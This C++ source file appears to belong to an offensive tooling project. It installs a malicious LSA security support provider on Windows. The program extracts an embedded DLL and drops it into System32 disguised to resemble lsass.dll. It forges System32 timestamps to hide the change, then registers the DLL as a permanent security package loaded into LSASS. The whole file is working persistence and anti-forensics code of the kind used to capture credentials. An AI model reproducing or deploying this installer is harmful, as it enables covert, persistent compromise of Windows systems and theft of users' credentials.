#define SECURITY_WIN32
#include <Windows.h>
#include <sspi.h>
#include <aclapi.h>

#include <monstars/file.h>
#include <monstars/logging.h>

#include "resource.h"

constexpr wchar_t c_ExemplarPath[] = L"C:\\Windows\\System32\\lsass.dll";

// stampable values - configured via web interface or helper script
constexpr wchar_t c_ProviderName[MAX_PATH] = L"BASKETBALLJONES";

int main()
{
    // load the provider DLL resource
    LPVOID providerBin = nullptr;
    DWORD providerSize = 0;
    HRSRC resInfo = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_BANG1), L"BANG");
    if (resInfo)
    {
        HGLOBAL res = LoadResource(NULL, resInfo);
        if (res)
        {
            providerSize = SizeofResource(NULL, resInfo);
            providerBin = LockResource(res);
        }
    }
    if (!providerBin)
    {
        LOG_LINE_ERROR;
        return ERROR_RESOURCE_DATA_NOT_FOUND;
    }

    // write the provider DLL to disk
    wchar_t targetPath[MAX_PATH];
    wsprintfW(targetPath, L"C:\\Windows\\System32\\%s.dll", c_ProviderName);
    if (!monstars::DropAndBlendFile(targetPath, static_cast<char*>(providerBin), providerSize, c_ExemplarPath))
    {
        LOG_LINE_ERROR;
        return ERROR_WRITE_FAULT;
    }
    // fix system32 timestamps
    if (!monstars::MatchFileTimes(L"C:\\Windows\\System32", c_ExemplarPath))
    {
        LOG_LINE_ERROR;
        return ERROR_TIME_SKEW;
    }
    
    SECURITY_PACKAGE_OPTIONS opts;
    opts.Size = sizeof(opts);
    opts.Type = SECPKG_OPTIONS_TYPE_LSA;
    opts.Flags = SECPKG_OPTIONS_PERMANENT;  // undocumented - sets the registry value for us
    opts.SignatureSize = 0;
    opts.Signature = nullptr;
    if (SEC_E_OK != AddSecurityPackageW(const_cast<wchar_t*>(c_ProviderName), &opts))
    {
        LOG_LINE_ERROR;
        return ERROR_INSTALL_FAILED;
    }

    return ERROR_SUCCESS;
}
